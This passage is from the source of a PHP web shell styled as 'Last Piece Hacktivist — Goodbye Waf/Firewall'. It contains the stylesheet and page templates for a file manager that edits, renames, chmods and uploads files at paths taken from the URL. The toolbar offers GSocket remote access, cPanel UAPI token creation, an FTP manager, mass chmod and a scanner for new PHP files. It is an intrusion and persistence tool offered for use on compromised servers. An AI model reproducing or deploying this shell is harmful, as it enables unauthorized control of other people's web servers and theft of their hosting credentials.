            height: auto;
            transform: translate(-50%, -50%);
            object-fit: cover;
        }
        
        .video-background::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(10, 14, 26, 0.75);
            pointer-events: none;
        }
        
        a { color: var(--accent); text-decoration: none; }
        a:hover { text-decoration: underline; }
        
        .login-page {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            position: relative;
        }
        
        .login-card {
            background: linear-gradient(145deg, rgba(17, 24, 39, 0.95), rgba(10, 14, 26, 0.98));
            border: 1px solid var(--border);
            border-radius: 16px;
            padding: 40px 32px;
            width: 100%;
            max-width: 400px;
            box-shadow: 
                0 0 40px rgba(0, 212, 255, 0.1),
                0 0 80px rgba(212, 165, 32, 0.05),
                inset 0 1px 0 rgba(255, 255, 255, 0.05);
            position: relative;
            overflow: hidden;
        }
        
        .login-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 3px;
            background: linear-gradient(90deg, var(--accent), var(--gold), var(--accent));
        }
        
        .login-header {
            text-align: center;
            margin-bottom: 28px;
        }
        
        .login-logo {
            width: 80px;
            height: 80px;
            margin: 0 auto 16px;
            border-radius: 50%;
            overflow: hidden;
            border: 3px solid var(--gold);
            box-shadow: 0 0 20px var(--glow-gold), 0 0 40px var(--glow-cyan);
        }
        
        .login-logo img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        .login-title {
            font-size: 22px;
            font-weight: 700;
            background: linear-gradient(90deg, var(--gold), var(--orange));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 4px;
            text-shadow: 0 0 30px var(--glow-gold);
        }
        
        .login-subtitle {
            color: var(--accent);
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        
        .form-group {
            margin-bottom: 16px;
        }
        
        .form-label {
            display: block;
            font-size: 12px;
            font-weight: 500;
            color: var(--text);
            margin-bottom: 8px;
        }
        
        .form-input {
            width: 100%;
            padding: 10px 12px;
            background: var(--bg-input);
            border: 1px solid var(--border);
            border-radius: 6px;
            color: var(--text);
            font-size: 14px;
            transition: border-color 0.2s, box-shadow 0.2s;
        }
        
        .form-input:focus {
            outline: none;
            border-color: var(--accent);
            box-shadow: 0 0 0 3px rgba(88, 166, 255, 0.15);
        }
        
        .form-input::placeholder { color: var(--text-muted); }
        
        .btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            padding: 10px 16px;
            font-size: 14px;
            font-weight: 500;
            border-radius: 6px;
            border: 1px solid transparent;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .btn-primary {
            background: linear-gradient(135deg, var(--gold), var(--orange));
            color: #0a0e1a;
            border-color: var(--gold);
            font-weight: 600;
        }
        
        .btn-primary:hover { 
            background: linear-gradient(135deg, #e0b020, #f08030);
            box-shadow: 0 0 15px var(--glow-gold);
        }
        
        .btn-wordpress {
            background: linear-gradient(135deg, #21759b, #0073aa);
            color: white;
            border-color: #21759b;
            text-decoration: none;
        }
        
        .btn-wordpress:hover { 
            background: linear-gradient(135deg, #2a8ab5, #0085c4);
            box-shadow: 0 0 15px rgba(33, 117, 155, 0.5);
        }
        
        .btn-gsocket {
            background: linear-gradient(135deg, #8b5cf6, #7c3aed);
            color: white;
            border-color: #8b5cf6;
        }
        
        .btn-gsocket:hover { 
            background: linear-gradient(135deg, #9d6fff, #8b5cf6);
            box-shadow: 0 0 15px rgba(139, 92, 246, 0.5);
        }
        
        .btn-cpanel {
            background: linear-gradient(135deg, #ff6a00, #ee5a00);
            color: white;
            border-color: #ff6a00;
        }
        
        .btn-cpanel:hover { 
            background: linear-gradient(135deg, #ff8020, #ff6a00);
            box-shadow: 0 0 15px rgba(255, 106, 0, 0.5);
        }
        
        .btn-ftp {
            background: linear-gradient(135deg, #10b981, #059669);
            color: white;
            border-color: #10b981;
        }
        
        .btn-ftp:hover { 
            background: linear-gradient(135deg, #34d399, #10b981);
            box-shadow: 0 0 15px rgba(16, 185, 129, 0.5);
        }
        
        .btn-scan {
            background: linear-gradient(135deg, #06b6d4, #0891b2);
            color: white;
            border-color: #06b6d4;
        }
        
        .btn-scan:hover { 
            background: linear-gradient(135deg, #22d3ee, #06b6d4);
            box-shadow: 0 0 15px rgba(6, 182, 212, 0.5);
        }
        
        .btn-chmod {
            background: linear-gradient(135deg, #ec4899, #db2777);
            color: white;
            border-color: #ec4899;
        }
        
        .btn-chmod:hover { 
            background: linear-gradient(135deg, #f472b6, #ec4899);
            box-shadow: 0 0 15px rgba(236, 72, 153, 0.5);
        }
        
        .btn-remote {
            background: linear-gradient(135deg, #f59e0b, #d97706);
            color: white;
            border-color: #f59e0b;
        }
        
        .btn-remote:hover { 
            background: linear-gradient(135deg, #fbbf24, #f59e0b);
            box-shadow: 0 0 15px rgba(245, 158, 11, 0.5);
        }
        
        .btn-secondary {
            background: var(--bg-card);
            color: var(--text);
            border-color: var(--border);
        }
        
        .btn-secondary:hover { background: var(--border-light); }
        
        .btn-danger {
            background: transparent;
            color: var(--red);
            border-color: var(--border);
        }
        
        .btn-danger:hover { background: rgba(248, 81, 73, 0.1); }
        
        .btn-sm { padding: 6px 12px; font-size: 12px; }
        .btn-xs { padding: 4px 8px; font-size: 11px; }
        
        .error-msg {
            background: rgba(248, 81, 73, 0.1);
            border: 1px solid rgba(248, 81, 73, 0.4);
            color: var(--red);
            padding: 10px 12px;
            border-radius: 6px;
            font-size: 13px;
            margin-bottom: 16px;
        }
        
        .success-msg {
            background: rgba(0, 212, 255, 0.1);
            border: 1px solid rgba(0, 212, 255, 0.4);
            color: var(--accent);
            padding: 10px 12px;
            border-radius: 6px;
            font-size: 13px;
            margin-bottom: 16px;
        }
        
        .app { min-height: 100vh; display: flex; flex-direction: column; }
        
        .header {
            background: linear-gradient(180deg, rgba(17, 24, 39, 0.98), rgba(10, 14, 26, 0.95));
            border-bottom: 1px solid var(--border);
            padding: 12px 16px;
            position: sticky;
            top: 0;
            z-index: 100;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3), 0 0 30px rgba(0, 212, 255, 0.05);
        }
        
        .header::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            height: 1px;
            background: linear-gradient(90deg, transparent, var(--accent), var(--gold), var(--accent), transparent);
        }
        
        .header-content {
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 12px;
            max-width: 1400px;
            margin: 0 auto;
        }
        
        .brand {
            display: flex;
            align-items: center;
            gap: 10px;
            flex-shrink: 0;
        }
        
        .brand-icon {
            width: 36px;
            height: 36px;
            border-radius: 50%;
            overflow: hidden;
            border: 2px solid var(--gold);
            box-shadow: 0 0 10px var(--glow-gold);
        }
        
        .brand-icon img { 
            width: 100%; 
            height: 100%; 
            object-fit: cover; 
        }
        
        .brand-text {
            font-size: 13px;
            font-weight: 700;
            color: var(--text-bright);
        }
        
        .brand-text span {
            background: linear-gradient(90deg, var(--gold), var(--orange));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        
        .brand-text small {
            display: block;
            font-size: 9px;
            font-weight: 500;
            color: var(--accent);
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-top: -2px;
        }
        
        .header-actions {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .main {
            flex: 1;
            padding: 16px;
            max-width: 1400px;
            margin: 0 auto;
            width: 100%;
        }
        
        .breadcrumb {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 8px;
            padding: 10px 14px;
            margin-bottom: 16px;
            display: flex;
            align-items: center;
            gap: 6px;
            overflow-x: auto;
            white-space: nowrap;
            font-size: 13px;
        }
        
        .breadcrumb::-webkit-scrollbar { height: 0; }
        
        .breadcrumb-icon {
            width: 16px;
            height: 16px;
            color: var(--text-muted);
            flex-shrink: 0;
        }
        
        .breadcrumb a { color: var(--accent); }
        .breadcrumb a:hover { color: var(--gold); text-decoration: none; }
        .breadcrumb-sep { color: var(--gold); }
        
        .card {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 8px;
            overflow: hidden;
        }
        
        .card-header {
            padding: 14px 16px;
            border-bottom: 1px solid var(--border);
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 14px;
            font-weight: 600;
            color: var(--text-bright);
        }
        
        .card-header svg {
            width: 18px;
            height: 18px;
            color: var(--gold);
            flex-shrink: 0;
        }
        
        .card-body {
            padding: 16px;
        }
        
        .form-group {
            margin-bottom: 14px;
        }
        
        .form-label {
            display: block;
            font-size: 13px;
            font-weight: 500;
            color: var(--text-muted);
            margin-bottom: 6px;
        }
        
        .form-input {
            width: 100%;
            padding: 10px 12px;
            background: var(--bg-input);
            border: 1px solid var(--border);
            border-radius: 6px;
            color: var(--text);
            font-size: 13px;
        }
        
        .form-input:focus {
            outline: none;
            border-color: var(--green);
        }
        
        .text-muted {
            color: var(--text-muted);
        }
        
        .action-form {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 8px;
            overflow: hidden;
        }
        
        .action-form-header {
            padding: 12px 16px;
            border-bottom: 1px solid var(--border);
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 12px;
        }
        
        .action-form-title {
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 14px;
            font-weight: 600;
            color: var(--text-bright);
        }
        
        .action-form-title svg {
            color: var(--gold);
            flex-shrink: 0;
        }
        
        .action-form-file {
            font-weight: 400;
            color: var(--text-muted);
            font-size: 13px;
        }
        
        .action-form-body {
            padding: 16px;
        }
        
        .form-inline {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        
        .form-label-inline {
            font-size: 13px;
            font-weight: 500;
            color: var(--text-muted);
            white-space: nowrap;
            min-width: 80px;
        }
        
        .form-input-inline {
            flex: 1;
            padding: 10px 12px;
            background: var(--bg-input);
            border: 1px solid var(--border);
            border-radius: 6px;
            color: var(--text);
            font-size: 13px;
        }
        
        .form-input-inline:focus {
            outline: none;
            border-color: var(--green);
        }
        
        .toolbar {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 8px;
            padding: 12px 16px;
            margin-bottom: 10px;
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            gap: 12px;
        }
        
        .toolbar-label {
            font-size: 11px;
            font-weight: 600;
            color: var(--gold);
            text-transform: uppercase;
            letter-spacing: 1px;
            min-width: 65px;
            padding-right: 10px;
            border-right: 1px solid var(--border);
        }
        
        .toolbar-section {
            display: flex;
            align-items: center;
            gap: 8px;
            flex-wrap: wrap;
        }
        
        .terminal-form {
            flex: 1;
            display: flex;
            align-items: center;
            gap: 8px;
            flex: 1;
            min-width: 200px;
            width: 100%;
        }
        
        .terminal-label {
            display: flex;
            align-items: center;
            gap: 6px;
            color: var(--green);
            font-size: 13px;
            font-weight: 500;
            white-space: nowrap;
            flex-shrink: 0;
        }
        
        .terminal-label svg {
            width: 16px;
            height: 16px;
        }
        
        .terminal-input {
            flex: 1 1 auto;
            min-width: 150px;
            width: 100%;
            padding: 8px 12px;
            background: var(--bg-input);
            border: 1px solid var(--border);
            border-radius: 6px;
            color: var(--accent);
            font-family: 'SFMono-Regular', Consolas, monospace;
            font-size: 13px;
        }
        
        .terminal-form .btn {
            flex-shrink: 0;
        }
        
        .terminal-input:focus {
            outline: none;
            border-color: var(--accent);
            box-shadow: 0 0 10px var(--glow-cyan);
        }
        
        .terminal-output {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 8px;
            padding: 12px 16px;
            margin-bottom: 16px;
            font-family: 'SFMono-Regular', Consolas, monospace;
            font-size: 12px;
            max-height: 150px;
            overflow: auto;
            white-space: pre-wrap;
            word-break: break-all;
            color: var(--text);
        }
        
        .upload-label {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 8px 14px;
            background: var(--bg-input);
            border: 1px solid var(--border);
            border-radius: 6px;
            cursor: pointer;
            transition: all 0.2s;
            font-size: 13px;
            color: var(--text);
        }
        
        .upload-label:hover {
            border-color: var(--accent);
            background: rgba(88, 166, 255, 0.05);
        }
        
        .upload-label svg {
            width: 16px;
            height: 16px;
            color: var(--accent);
        }
        
        .upload-label input { display: none; }
        
        .action-buttons {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            align-items: center;
        }
        
        .table-wrapper {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 8px;
            overflow: hidden;
        }
        
        .table-scroll {
            overflow-x: auto;
        }
        
        .file-table {
            width: 100%;
            border-collapse: collapse;
            font-size: 13px;
        }
        
        .file-table th,
        .file-table td {
            padding: 10px 14px;
            text-align: left;
            border-bottom: 1px solid var(--border);
        }
        
        .file-table th {
            background: linear-gradient(180deg, rgba(0, 212, 255, 0.05), transparent);
            font-weight: 600;
            color: var(--gold);
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            white-space: nowrap;
        }
        
        .file-table tr:last-child td { border-bottom: none; }
        
        .file-table tr:hover td { 
            background: rgba(0, 212, 255, 0.03); 
        }
        
        .file-name {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .file-icon {
            width: 18px;
            height: 18px;
            flex-shrink: 0;
        }
        
        .file-icon.folder { color: var(--gold); }
        .file-icon.code { color: var(--accent); }
        .file-icon.image { color: var(--purple); }
        .file-icon.archive { color: var(--orange); }
        .file-icon.file { color: var(--text-muted); }
        
        .perm-writable { color: var(--green); font-weight: 500; }
        .perm-readonly { color: var(--red); font-weight: 500; }
        .perm-neutral { color: var(--text); }
        
        .file-actions {
            display: flex;
            gap: 4px;
        }
        
        .action-btn {
            padding: 4px 8px;
            background: transparent;
            border: 1px solid var(--border);
            border-radius: 4px;
            color: var(--text-muted);
            font-size: 11px;
            cursor: pointer;
            transition: all 0.2s;
            text-decoration: none;
        }
        
        .action-btn:hover {
            background: var(--border-light);
            color: var(--text);
            text-decoration: none;
        }
        
        .action-btn.danger:hover {
            background: rgba(248, 81, 73, 0.1);
            border-color: var(--red);
            color: var(--red);
        }
        
        .editor-container {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 8px;
            overflow: hidden;
        }
        
        .editor-header {
            padding: 12px 14px;
            border-bottom: 1px solid var(--border);
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 12px;
            flex-wrap: wrap;
        }
        
        .editor-title {
            font-size: 13px;
            font-weight: 600;
            color: var(--text-bright);
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .editor-actions {
            display: flex;
            gap: 8px;
        }
        
        .editor-textarea {
            width: 100%;
            min-height: 400px;
            padding: 14px;
            background: var(--bg-input);
            border: none;
            color: var(--text);
            font-family: 'SFMono-Regular', Consolas, monospace;
            font-size: 13px;
            line-height: 1.6;
            resize: vertical;
        }
        
        .editor-textarea:focus { outline: none; }
        
        .modal-overlay {
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.7);
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            z-index: 1000;
        }
        
        .modal {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 12px;
            width: 100%;
            max-width: 400px;
        }
        
        .modal-header {
            padding: 16px;
            border-bottom: 1px solid var(--border);
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        
        .modal-title {
            font-size: 16px;
            font-weight: 600;
            color: var(--text-bright);
        }
        
        .modal-close {
            background: none;
            border: none;
            color: var(--text-muted);
            cursor: pointer;
            padding: 4px;
        }
        
        .modal-close:hover { color: var(--text); }
        
        .modal-body { padding: 16px; }
        .modal-footer {
            padding: 16px;
            border-top: 1px solid var(--border);
            display: flex;
            gap: 8px;
            justify-content: flex-end;
        }
        
        @media (max-width: 900px) {
            .toolbar { 
                flex-direction: column;
                align-items: stretch;
                gap: 10px;
            }
            .toolbar-divider { display: none; }
            .terminal-form { width: 100%; }
            .toolbar-section { 
                justify-content: center;
                flex-wrap: wrap;
            }
            .action-buttons {
                justify-content: center;
                width: 100%;
            }
        }
        
        @media (max-width: 768px) {
            .header { padding: 10px 12px; }
            .brand-text { display: none; }
            .main { padding: 12px; }
            .breadcrumb { padding: 8px 12px; font-size: 12px; }
            
            .file-table th,
            .file-table td { padding: 8px 10px; }
            
            .hide-mobile { display: none; }
            
            .file-actions { flex-wrap: wrap; gap: 4px; }
        }
        
        @media (max-width: 600px) {
            .info-row {
                padding: 8px 12px;
                font-size: 12px;
            }
            .info-row .info-label {
                min-width: 100px;
            }
            .disabled-list {
                gap: 4px;
            }
            .disabled-func {
                font-size: 10px;
                padding: 2px 6px;
            }
        }
        
        @media (max-width: 480px) {
            .header-content { flex-wrap: wrap; }
            .breadcrumb { font-size: 11px; }
            .file-table { font-size: 12px; }
            .action-btn { padding: 3px 6px; font-size: 10px; }
            .toolbar { padding: 10px 12px; }
            .terminal-label { display: none; }
            .btn-sm { padding: 6px 10px; font-size: 11px; }
        }
        
.hidden { display: none !important; }
        
        .uploader-row {
            display: flex;
            gap: 8px;
            align-items: center;
            margin-bottom: 8px;
        }
        
        .custom-file-input {
            flex: 1;
            display: flex;
            align-items: center;
            gap: 10px;
            background: var(--bg-input);
            border: 1px solid var(--border);
            border-radius: 6px;
            padding: 6px 10px;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .custom-file-input:hover {
            border-color: var(--accent);
            background: rgba(0, 212, 255, 0.05);
        }
        
        .custom-file-input input[type="file"] {
            display: none;
        }
        
        .custom-file-input .file-btn {
            display: flex;
            align-items: center;
            gap: 6px;
            background: linear-gradient(135deg, var(--accent), #0077b6);
            color: white;
            padding: 5px 12px;
            border-radius: 4px;
            font-size: 11px;
            font-weight: 500;
            white-space: nowrap;
        }
        
        .custom-file-input .file-name {
            font-size: 11px;
            color: var(--text-muted);
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            flex: 1;
        }
        
        .custom-file-input.has-file .file-name {
            color: var(--gold);
        }
        
        .app-footer {
            background: linear-gradient(180deg, var(--bg-card), rgba(10, 14, 26, 0.98));
            border-top: 1px solid var(--border);
            padding: 16px 20px;
            margin-top: 20px;
        }
        
        .app-footer::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 1px;
            background: linear-gradient(90deg, transparent, var(--gold), var(--accent), var(--gold), transparent);
        }
        
        .footer-content {
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 16px;
            max-width: 1200px;
            margin: 0 auto;
            position: relative;
        }
        
        .footer-brand {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        
        .footer-avatar {
            width: 45px;
            height: 45px;
            border-radius: 50%;
            border: 2px solid var(--gold);
            box-shadow: 0 0 15px var(--glow-gold), 0 0 25px var(--glow-cyan);
            object-fit: cover;
        }
        
        .footer-info {
            display: flex;
            flex-direction: column;
        }
        
        .footer-title {
            font-size: 14px;
            font-weight: 700;
            background: linear-gradient(90deg, var(--gold), var(--orange), var(--gold));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        
        .footer-version {
            font-size: 11px;
            color: var(--accent);
            font-weight: 500;
        }
        
        .footer-credit {
            font-size: 12px;
            color: var(--text-muted);
        }
        
        .footer-author {
            color: var(--gold);
            font-weight: 600;
        }
        
    </style>
</head>
<body>

<?php if (isset($_GET['edit'])): ?>
<?php $editFile = $_GET['edit']; $editContent = readFileContent($editFile); ?>
<div class="video-background">
    <video autoplay muted loop playsinline>
        <source src="/videos/background.mp4" type="video/mp4">
    </video>
</div>
<div class="app">
    <header class="header">
        <div class="header-content">
            <div class="brand">
                <div class="brand-icon">
                    <img src="https://l.top4top.io/p_3688fo4y41.png" alt="Last Piece">
                </div>
                <div class="brand-text"><span>Last Piece</span> Hacktivist<small>Goodbye Waf/Firewall</small></div>
            </div>
            <div class="header-actions">
                <a href="?nomi=<?php echo urlencode(dirname($editFile)); ?>" class="btn btn-secondary btn-sm">Back</a>
                <a href="?logout" class="btn btn-danger btn-sm">Logout</a>
            </div>
        </div>
    </header>
    
    <main class="main">
        <?php if ($responseMessage): ?>
        <div class="<?php echo $responseMessage['success'] ? 'success-msg' : 'error-msg'; ?>">
            <?php echo htmlspecialchars($responseMessage['message']); ?>
        </div>
        <?php endif; ?>
        
        <form method="POST" class="editor-container">
            <div class="editor-header">
                <div class="editor-title">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <path d="M14.5 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7.5L14.5 2z"/>
                        <polyline points="14 2 14 8 20 8"/>
                    </svg>
                    <?php echo htmlspecialchars(basename($editFile)); ?>
                </div>
                <div class="editor-actions">
                    <button type="submit" class="btn btn-primary btn-sm">Save Changes</button>
                </div>
            </div>
            <textarea name="content" class="editor-textarea"><?php echo htmlspecialchars($editContent); ?></textarea>
        </form>
    </main>
</div>

<?php elseif (isset($_GET['chmod'])): ?>
<?php $chmodFile = $_GET['chmod']; $currentPerm = @substr(sprintf('%o', fileperms($chmodFile)), -4); ?>
<div class="video-background">
    <video autoplay muted loop playsinline>
        <source src="/videos/background.mp4" type="video/mp4">
    </video>
</div>
<div class="app">
    <header class="header">
        <div class="header-content">
            <div class="brand">
                <div class="brand-icon">
                    <img src="https://l.top4top.io/p_3688fo4y41.png" alt="Last Piece">
                </div>
                <div class="brand-text"><span>Last Piece</span> Hacktivist<small>Goodbye Waf/Firewall</small></div>
            </div>
            <div class="header-actions">
                <a href="?nomi=<?php echo urlencode(dirname($chmodFile)); ?>" class="btn btn-secondary btn-sm">Back</a>
                <a href="?logout" class="btn btn-danger btn-sm">Logout</a>
            </div>
        </div>
    </header>
    
    <main class="main">
        <?php if ($responseMessage): ?>
        <div class="<?php echo $responseMessage['success'] ? 'success-msg' : 'error-msg'; ?>">
            <?php echo htmlspecialchars($responseMessage['message']); ?>
        </div>
        <?php endif; ?>
        
        <form method="POST" class="action-form">
            <div class="action-form-header">
                <div class="action-form-title">
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
                        <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
                    </svg>
                    <span>Change Permission</span>
                    <span class="action-form-file"><?php echo htmlspecialchars(basename($chmodFile)); ?></span>
                </div>
                <button type="submit" class="btn btn-primary btn-sm">Apply</button>
            </div>
            <div class="action-form-body">
                <div class="form-inline">
                    <label class="form-label-inline">Permission</label>
                    <input type="text" name="permission" class="form-input-inline" value="<?php echo htmlspecialchars($currentPerm); ?>" placeholder="e.g. 0755" required>
                </div>
            </div>
        </form>
    </main>
</div>

<?php elseif (isset($_GET['rename'])): ?>
<?php $renameFile = $_GET['rename']; ?>
<div class="video-background">
    <video autoplay muted loop playsinline>
        <source src="/videos/background.mp4" type="video/mp4">
    </video>
</div>
<div class="app">
    <header class="header">
        <div class="header-content">
            <div class="brand">
                <div class="brand-icon">
                    <img src="https://l.top4top.io/p_3688fo4y41.png" alt="Last Piece">
                </div>
                <div class="brand-text"><span>Last Piece</span> Hacktivist<small>Goodbye Waf/Firewall</small></div>
            </div>
            <div class="header-actions">
                <a href="?nomi=<?php echo urlencode(dirname($renameFile)); ?>" class="btn btn-secondary btn-sm">Back</a>
                <a href="?logout" class="btn btn-danger btn-sm">Logout</a>
            </div>
        </div>
    </header>
    
    <main class="main">
        <?php if ($responseMessage): ?>
        <div class="<?php echo $responseMessage['success'] ? 'success-msg' : 'error-msg'; ?>">
            <?php echo htmlspecialchars($responseMessage['message']); ?>
        </div>
        <?php endif; ?>
        
        <form method="POST" class="action-form">
            <div class="action-form-header">
                <div class="action-form-title">
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/>
                        <path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/>
                    </svg>
                    <span>Rename</span>
                    <span class="action-form-file"><?php echo htmlspecialchars(basename($renameFile)); ?></span>
                </div>
                <button type="submit" class="btn btn-primary btn-sm">Rename</button>
            </div>
            <div class="action-form-body">
                <div class="form-inline">
                    <label class="form-label-inline">New Name</label>
                    <input type="text" name="new_name" class="form-input-inline" value="<?php echo htmlspecialchars(basename($renameFile)); ?>" required>
                </div>
            </div>
        </form>
    </main>
</div>

<?php else: ?>
<?php $files = getFileDetails($currentDirectory); ?>
<div class="video-background">
    <video autoplay muted loop playsinline>
        <source src="/videos/background.mp4" type="video/mp4">
    </video>
</div>
<div class="app">
    <header class="header">
        <div class="header-content">
            <div class="brand">
                <div class="brand-icon">
                    <img src="https://l.top4top.io/p_3688fo4y41.png" alt="Last Piece">
                </div>
                <div class="brand-text"><span>Last Piece</span> Hacktivist<small>Goodbye Waf/Firewall</small></div>
            </div>
            <div class="header-actions">

                <a href="?logout" class="btn btn-danger btn-sm">
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/>
                        <polyline points="16 17 21 12 16 7"/>
                        <line x1="21" y1="12" x2="9" y2="12"/>
                    </svg>
                    <span class="hide-mobile">Logout</span>
                </a>
            </div>
        </div>
    </header>
    
    <main class="main">
        <?php if ($responseMessage): ?>
        <div class="<?php echo $responseMessage['success'] ? 'success-msg' : 'error-msg'; ?>">
            <?php echo htmlspecialchars($responseMessage['message']); ?>
        </div>
        <?php endif; ?>
        
        <div class="breadcrumb">
            <svg class="breadcrumb-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <path d="m3 9 9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/>
                <polyline points="9 22 9 12 15 12 15 22"/>
            </svg>
            <?php
            $pathParts = explode('/', $currentDirectory);
            $buildPath = '';
            foreach ($pathParts as $i => $part) {
                if ($part === '') continue;
                $buildPath .= '/' . $part;
                if ($i > 0) echo '<span class="breadcrumb-sep">/</span>';
                echo '<a href="?nomi=' . urlencode($buildPath) . '">' . htmlspecialchars($part) . '</a>';
            }
            ?>
        </div>
        
        <div class="toolbar">
            <div class="toolbar-label">Features</div>
            <div class="toolbar-section">
                <form method="POST" style="display: contents;">
                    <button type="submit" name="wordpress_tool" class="btn btn-wordpress btn-sm">
                        <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor">
                            <path d="M12 2C6.486 2 2 6.486 2 12s4.486 10 10 10 10-4.486 10-10S17.514 2 12 2zm0 19.5c-5.238 0-9.5-4.262-9.5-9.5S6.762 2.5 12 2.5s9.5 4.262 9.5 9.5-4.262 9.5-9.5 9.5z"/>
                        </svg>
                        WordPress
                    </button>
                </form>
                <button onclick="showModal('gsocket')" class="btn btn-gsocket btn-sm">
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <path d="M12 2L2 7l10 5 10-5-10-5z"/>
                        <path d="M2 17l10 5 10-5"/>
                        <path d="M2 12l10 5 10-5"/>
                    </svg>
                    GSocket
                </button>
                <form method="POST" style="display: contents;">
                    <button type="submit" name="cpanel_token" class="btn btn-cpanel btn-sm">
                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
                            <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
                        </svg>
                        Create Uapi Token
                    </button>
                </form>
                <button onclick="showModal('ftp')" class="btn btn-ftp btn-sm">
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
                        <polyline points="17 8 12 3 7 8"/>
                        <line x1="12" y1="3" x2="12" y2="15"/>
                    </svg>
                    FTP Manager
                </button>
            </div>
        </div>
        
        <div class="toolbar">
            <div class="toolbar-label">Scanner</div>
            <div class="toolbar-section">
                <form method="POST" style="display: contents;">
                    <button type="submit" name="scan_deep" class="btn btn-scan btn-sm">
                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <path d="M3 3v18h18"/>
                            <path d="m19 9-5 5-4-4-3 3"/>
                        </svg>
                        Deepest Dir
                    </button>
                </form>
                <form method="POST" style="display: contents;">
                    <input type="hidden" name="scan_ext" value="php">
                    <button type="submit" name="scan_newly" class="btn btn-scan btn-sm">
                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <circle cx="12" cy="12" r="10"/>
                            <polyline points="12 6 12 12 16 14"/>
                        </svg>
                        New PHP Files
                    </button>
                </form>
                <button onclick="showModal('chmod')" class="btn btn-chmod btn-sm">
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                    </svg>
                    Mass Chmod
                </button>
            </div>
        </div>
        
        <div class="toolbar">
            <div class="toolbar-label">Files</div>
            <div class="toolbar-section">
                <form method="POST" enctype="multipart/form-data" style="display: contents;">
                    <label class="upload-label">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
                            <polyline points="17 8 12 3 7 8"/>
                            <line x1="12" y1="3" x2="12" y2="15"/>
                        </svg>
                        Upload
                        <input type="file" name="file" onchange="this.form.submit()">
                    </label>
